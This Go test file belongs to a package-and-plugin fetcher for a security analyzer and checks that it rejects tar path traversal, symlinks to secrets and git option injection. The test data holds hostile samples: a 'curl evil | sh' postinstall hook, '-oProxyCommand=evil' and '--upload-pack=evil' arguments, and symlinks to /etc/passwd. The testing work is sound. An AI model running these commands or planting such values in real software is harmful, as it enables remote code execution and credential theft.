package fetchers

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ---------- tar safety -------------------------------------------

func TestSafeTarMember_RejectsSymlink(t *testing.T) {
	h := &tar.Header{Name: "foo.js", Typeflag: tar.TypeSymlink}
	if safeTarMember(h) {
		t.Error("symlink accepted")
	}
}

func TestSafeTarMember_RejectsAbsolutePath(t *testing.T) {
	h := &tar.Header{Name: "/etc/passwd", Typeflag: tar.TypeReg}
	if safeTarMember(h) {
		t.Error("absolute path accepted")
	}
}

func TestSafeTarMember_RejectsParentTraversal(t *testing.T) {
	h := &tar.Header{Name: "../etc/passwd", Typeflag: tar.TypeReg}
	if safeTarMember(h) {
		t.Error("../ accepted")
	}
	h2 := &tar.Header{Name: "a/../../b", Typeflag: tar.TypeReg}
	if safeTarMember(h2) {
		t.Error("a/../../b accepted")
	}
}

func TestSafeTarMember_AcceptsRegularNested(t *testing.T) {
	h := &tar.Header{Name: "package/index.js", Typeflag: tar.TypeReg}
	if !safeTarMember(h) {
		t.Error("regular member rejected")
	}
}

func TestSafeTarMember_RejectsDeviceNodes(t *testing.T) {
	for _, tf := range []byte{tar.TypeChar, tar.TypeBlock, tar.TypeFifo, tar.TypeLink} {
		h := &tar.Header{Name: "x", Typeflag: tf}
		if safeTarMember(h) {
			t.Errorf("device/link type %d accepted", tf)
		}
	}
}

func TestWalkTar_RejectsSymlinkPayload(t *testing.T) {
	// Build a tar.gz with a regular file and a symlink. Only the
	// regular file must come through.
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	body := []byte("regular contents")
	_ = tw.WriteHeader(&tar.Header{
		Name: "package/index.js", Typeflag: tar.TypeReg, Size: int64(len(body)),
	})
	_, _ = tw.Write(body)
	_ = tw.WriteHeader(&tar.Header{
		Name: "package/evil-link", Typeflag: tar.TypeSymlink, Linkname: "/etc/passwd",
	})
	_ = tw.Close()
	_ = gz.Close()

	got, _, err := readTarGzMembers(buf.Bytes(), true,
		func(_ string, _ []string) bool { return true },
		func(_ string, parts []string) string { return strings.Join(parts, "/") })
	if err != nil {
		t.Fatalf("readTarGzMembers: %v", err)
	}
	if _, ok := got["index.js"]; !ok {
		t.Errorf("regular file missing: %v", got)
	}
	if _, ok := got["evil-link"]; ok {
		t.Error("symlink leaked into bundle")
	}
}

// ---------- fitBundle cap ---------------------------------------

func TestFitBundle_CapsTotalBytes(t *testing.T) {
	files := newOrderedFiles()
	for _, k := range []string{"a", "b", "c", "d"} {
		files.set(k, strings.Repeat("x", 20_000))
	}
	out := fitBundle(files)
	total := 0
	for _, v := range out {
		total += len(v)
	}
	if total > MaxBundleBytes+200 { // +200 accounts for "cap reached" marker
		t.Errorf("bundle exceeded cap: %d", total)
	}
}

func TestFitBundle_PriorityOrderPreservesRiskyScripts(t *testing.T) {
	// Insert risky-scripts entry FIRST, then several large entries.
	// Even when the large entries blow the cap, risky-scripts must
	// still be in the output. This pins the security-critical
	// ordering guarantee.
	files := newOrderedFiles()
	files.set("package.json#scripts", `{"postinstall": "curl evil | sh"}`)
	for i := 0; i < 20; i++ {
		files.set(string(rune('a'+i)), strings.Repeat("x", 8_000))
	}
	out := fitBundle(files)
	if _, ok := out["package.json#scripts"]; !ok {
		t.Errorf("risky-scripts entry was evicted; bundle: %v", out)
	}
}

func TestOrderedFiles_PreservesInsertionOrder(t *testing.T) {
	files := newOrderedFiles()
	files.set("z", "1")
	files.set("a", "2")
	files.set("m", "3")
	files.set("a", "2-updated") // re-insert keeps original position
	want := []string{"z", "a", "m"}
	for i, k := range files.order {
		if k != want[i] {
			t.Errorf("position %d: got %q want %q", i, k, want[i])
		}
	}
	if files.data["a"] != "2-updated" {
		t.Errorf("re-insert should overwrite content: %q", files.data["a"])
	}
}

// ---------- bundle digest ----------------------------------------

// TestDigestBundle_DeterministicOverMapOrder pins that two equal
// content sets produce the same digest regardless of map-iteration
// order. Without sorted keys this would flake intermittently.
func TestDigestBundle_DeterministicOverMapOrder(t *testing.T) {
	a := map[string]string{"a": "1", "b": "2", "c": "3"}
	b := map[string]string{"c": "3", "a": "1", "b": "2"}
	if digestBundle(a) != digestBundle(b) {
		t.Errorf("same content, different map order produced different digests")
	}
}

// TestDigestBundle_ChangeDetected: any byte change anywhere in the
// curated file set must change the digest. This is the invariant the
// analyzer cache relies on.
func TestDigestBundle_ChangeDetected(t *testing.T) {
	base := map[string]string{"package.json#scripts": `{"postinstall":"echo hi"}`}
	mutated := map[string]string{"package.json#scripts": `{"postinstall":"curl evil"}`}
	if digestBundle(base) == digestBundle(mutated) {
		t.Error("byte change did not perturb digest")
	}
}

// TestDigestBundle_EmptyIsConstant: short-circuited "no install
// hooks" bundles produce a stable digest so cache lookups still work.
func TestDigestBundle_EmptyIsConstant(t *testing.T) {
	d1 := digestBundle(map[string]string{})
	d2 := digestBundle(nil)
	if d1 != d2 {
		t.Errorf("empty vs nil digests diverged: %q vs %q", d1, d2)
	}
	if d1 == "" {
		t.Error("empty bundle produced empty digest")
	}
}

// TestDigestBundle_NullSeparatorPreventsAdjacencyCollision: a naive
// concat of (key, value) would let pairs like ("ab", "c") and
// ("a", "bc") collide. The null-byte separator must prevent that.
func TestDigestBundle_NullSeparatorPreventsAdjacencyCollision(t *testing.T) {
	a := map[string]string{"ab": "c"}
	b := map[string]string{"a": "bc"}
	if digestBundle(a) == digestBundle(b) {
		t.Error("adjacency collision: separator not enforced")
	}
}

// ---------- plugin local: symlink rejects --------------------

func TestFetchPluginLocal_RejectsSymlinkedManifest(t *testing.T) {
	tmp := t.TempDir()
	plugin := filepath.Join(tmp, "evil")
	if err := os.MkdirAll(filepath.Join(plugin, ".claude-plugin"), 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(tmp, "host-secret")
	if err := os.WriteFile(target, []byte("AKIAIOSFODNN7EXAMPLE"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(plugin, ".claude-plugin", "plugin.json")); err != nil {
		t.Fatal(err)
	}
	b := FetchPluginLocal("evil", plugin)
	if b == nil {
		t.Fatal("nil bundle")
	}
	if _, ok := b.Files[".claude-plugin/plugin.json"]; ok {
		t.Error("symlinked plugin.json leaked into bundle")
	}
	for _, content := range b.Files {
		if strings.Contains(content, "AKIAIOSFODNN7EXAMPLE") {
			t.Error("host secret embedded in bundle")
		}
	}
}

func TestFetchPluginLocal_RejectsSymlinkInHooks(t *testing.T) {
	tmp := t.TempDir()
	plugin := filepath.Join(tmp, "plug")
	if err := os.MkdirAll(filepath.Join(plugin, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(tmp, "secret.txt")
	if err := os.WriteFile(target, []byte("AKIA-EVIL"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(plugin, "hooks", "leak.sh")); err != nil {
		t.Fatal(err)
	}
	b := FetchPluginLocal("plug", plugin)
	if b == nil {
		t.Fatal("nil bundle")
	}
	if _, ok := b.Files["hooks/leak.sh"]; ok {
		t.Error("symlink in hooks/ leaked")
	}
}

func TestFetchPluginLocal_BundlesRealFiles(t *testing.T) {
	tmp := t.TempDir()
	plugin := filepath.Join(tmp, "ok")
	if err := os.MkdirAll(filepath.Join(plugin, ".claude-plugin"), 0o755); err != nil {
		t.Fatal(err)
	}
	manifest := map[string]any{"name": "ok", "version": "1.0"}
	data, _ := json.Marshal(manifest)
	if err := os.WriteFile(filepath.Join(plugin, ".claude-plugin", "plugin.json"), data, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(plugin, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(plugin, "hooks", "demo.sh"), []byte("echo hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	b := FetchPluginLocal("ok", plugin)
	if b == nil {
		t.Fatal("nil bundle")
	}
	if _, ok := b.Files[".claude-plugin/plugin.json"]; !ok {
		t.Error("real manifest missing")
	}
	if _, ok := b.Files["hooks/demo.sh"]; !ok {
		t.Error("hooks file missing")
	}
	if b.Version != "1.0" {
		t.Errorf("version metadata not merged: %q", b.Version)
	}
}

func TestFetchPluginLocal_NilForMissingDir(t *testing.T) {
	if FetchPluginLocal("x", "/nonexistent/path/x9q") != nil {
		t.Error("nonexistent dir returned a bundle")
	}
}

// ---------- git option-injection defense -------------------------

func TestSafeGitArg_RejectsOptionInjection(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"https://github.com/foo/bar", true},
		{"git@github.com:foo/bar.git", true},
		{"ssh://git@github.com/foo/bar", true},
		{"main", true},

		// Hostile inputs: must all be rejected.
		{"-oProxyCommand=evil", false},
		{"--upload-pack=evil", false},
		{"ssh://-oProxyCommand=evil/x", false},
		{"https://-evil/x", false},
		{"git@-host:path", false},
		{"", false},
	}
	for _, tc := range cases {
		got := safeGitArg(tc.in)
		if got != tc.want {
			t.Errorf("safeGitArg(%q) = %v, want %v", tc.in, got, tc.want)
		}
	}
}

func TestFetchPluginGit_RejectsHostileURL(t *testing.T) {
	// Hostile URL: scheme matches the gitURLRE prefix but host part
	// starts with '-'. Must not invoke `git clone`.
	if b := FetchPluginGit("ssh://-oProxyCommand=evil/x", ""); b != nil {
		t.Errorf("hostile URL accepted: %+v", b)
	}
	if b := FetchPluginGit("https://example.com/foo", "--upload-pack=evil"); b != nil {
		t.Errorf("hostile ref accepted: %+v", b)
	}
}

func TestPluginInterestingDirs(t *testing.T) {
	hasSkills := false
	for _, d := range pluginInterestingDirs {
		if d == "skills" {
			hasSkills = true
			break
		}
	}
	if !hasSkills {
		t.Error("skills/ missing from pluginInterestingDirs")
	}
}
